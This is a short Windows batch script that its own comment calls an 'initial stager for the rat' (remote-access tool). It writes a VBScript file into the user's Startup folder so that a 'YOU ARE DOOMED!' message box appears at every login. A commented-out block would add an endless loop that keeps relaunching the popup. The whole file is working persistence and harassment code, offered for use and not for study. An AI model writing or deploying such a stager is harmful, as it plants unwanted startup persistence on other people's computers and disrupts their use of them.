@echo off

@rem initial stager for the rat

cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

(echo MsgBox "YOU ARE DOOMED!" ^& vbCrLf ^& "NOT WORTH IT", vbOkOnly+vbExclamation+vbDefaultButton1, "TITLE")>popup.vbs

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

